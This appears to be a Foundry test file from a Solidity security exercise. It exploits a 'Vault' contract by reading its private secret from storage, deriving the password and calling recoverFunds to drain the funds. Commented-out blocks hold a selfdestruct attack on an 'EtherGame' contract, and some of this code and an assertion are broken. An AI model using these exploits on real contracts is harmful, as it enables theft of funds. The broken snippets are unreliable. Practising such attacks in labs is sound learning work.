// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.11;

import "lib/forge-std/src/console.sol";
import "lib/forge-std/src/Test.sol";
import "../src/Vault.sol";

contract VaultTest is Test {
    Vault public vault;
    address public Juan;

    function setUp() public {
        vault = new Vault{value: 0.0001 ether}();
        Juan = makeAddr("Juan"); 
    }

    function testVault() public{
        vm.startPrank(Juan);
        vm.deal(Juan, 0.0001 ether);
        bytes32 secretValue;
        uint256 password;
        console.log("BalanceJuan", Juan.balance);
        
        secretValue = vm.load(address(vault), bytes32(uint256(0)));
        console.logBytes32(secretValue);

        console.log("Balance Vault: ",address(vault).balance);
       
        password = uint256(keccak256(abi.encodePacked(secretValue,address(vault).balance+Juan.balance)));
        //require(sent, "Ha fallado el Call");
        console.log("Password",password);

        (bool sent, ) = payable(address(vault)).call{value:Juan.balance}(abi.encodeWithSignature("recoverFunds(uint256)", password));
        console.log("Balance Vault: ",address(vault).balance);
        
        assertEq(Juan.balance, 0.0002);
        console.log("BalanceJuan", Juan.balance);



        //Web3.eth.getStorageAt(address, slotNumber = 0, 1, 2, etc., console.log)
     

       /*constructor(bytes32 secret, uint256 balance) {
            _secret = secret;
            _balance = balance;
            _password = keccak256(abi.encodePacked(_secret, _balance));
        }

        function getPassword() public view returns (bytes32) {
            return _password;
        }

        function getSecret() public view returns (bytes32) {
            return _secret;
        }

        function calculateSecret(uint256 targetBalance) public view returns (bytes32) {
            bytes32 calculatedPassword = keccak256(abi.encodePacked(address(vault)._secret, address(vault).balance));
            console.log(calculatedPassword);
        }
}*/
    }

}
/*



contract EtherGame { 
    uint public targetAmount = 5 ether; 
    address public winner; 
    function play() public payable { 
        require(msg.value == 1 ether, "You can only send 1 Ether"); 

        uint balance = address(this).balance; 
        require(balance <= targetAmount, "Game is over"); 

        if (balance == targetAmount) {
             winner = msg.sender; } } 
    function claimReward() public { 
        require(msg.sender == winner, "Not winner"); 
        (bool sent, ) = msg.sender.call{value: address(this).balance}(""); require(sent, "Failed to send Ether"); } } contract Attack { EtherGame etherGame; constructor(EtherGame _etherGame) { etherGame = EtherGame(_etherGame); } function attack() public payable { address payable addr = payable(address(etherGame)); selfdestruct(addr); } }


 pragma solidity ^0.8.10; contract EtherGame { 
    uint public targetAmount = 5 ether; 
    address public winner; 
    uint public balance; 
    function play() public payable { 
        require(msg.value == 1 ether, "You can only send 1 Ether"); 
        uint balance += msg.value; 
        require(balance <= targetAmount, "Game is over"); 
        if (balance == targetAmount) { winner = msg.sender; } } 
    function claimReward() public { 
        require(msg.sender == winner, "Not winner"); 
        (bool sent, ) = msg.sender.call{value: address(this).balance}(""); 
        require(sent, "Failed to send Ether"); } } 
        
        contract Attack { 
            EtherGame etherGame; 
            constructor(EtherGame _etherGame) { 
                etherGame = EtherGame(_etherGame); 
                } 
            function attack() public payable { 
                address payable addr = payable(address(etherGame)); 
                selfdestruct(addr); } }

*/
